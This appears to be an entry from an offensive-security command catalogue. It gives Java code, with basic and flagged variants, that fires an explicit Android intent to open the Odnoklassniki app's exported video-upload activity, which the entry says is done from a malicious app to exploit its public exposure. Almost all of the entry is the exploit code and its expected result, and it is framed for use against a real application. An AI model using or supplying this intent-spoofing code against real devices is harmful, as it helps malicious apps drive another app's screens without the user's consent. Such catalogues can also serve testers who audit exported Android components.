---
data: >-
  Intent m = new Intent();
  m.setClassName("ru.ok.android","ru.ok.android.ui.activity.StartVideoUploadActivity");
  startActivity(m);
tags:
  - intent
  - spoofing
type: command
output: null
executor: java
platforms:
  - Android
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:24:42.357Z'
id: 649bbb41-daaf-493a-ab91-c46386e425b1
verified: false
validated: true
submitted: true
---
# start-video-upload-intent

## Command

```java
Intent m = new Intent(); m.setClassName("ru.ok.android","ru.ok.android.ui.activity.StartVideoUploadActivity"); startActivity(m);
```

## Description

Creates an explicit intent to launch the Odnoklassniki video upload activity from a malicious app, exploiting its public exposure.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| setClassName | Specifies package and class: "ru.ok.android", "ru.ok.android.ui.activity.StartVideoUploadActivity" | Yes |
| startActivity | Launches the targeted activity | Yes |

## Examples

### Basic Usage

```java
Intent m = new Intent(); m.setClassName("ru.ok.android","ru.ok.android.ui.activity.StartVideoUploadActivity"); startActivity(m);
```

### Advanced Usage

Add flags if needed:
```java
Intent m = new Intent(); m.setClassName("ru.ok.android","ru.ok.android.ui.activity.StartVideoUploadActivity"); m.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK); startActivity(m);
```

## Expected Output

The StartVideoUploadActivity launches, showing the video selection and upload interface.

## Related

- [[Related Procedure]]
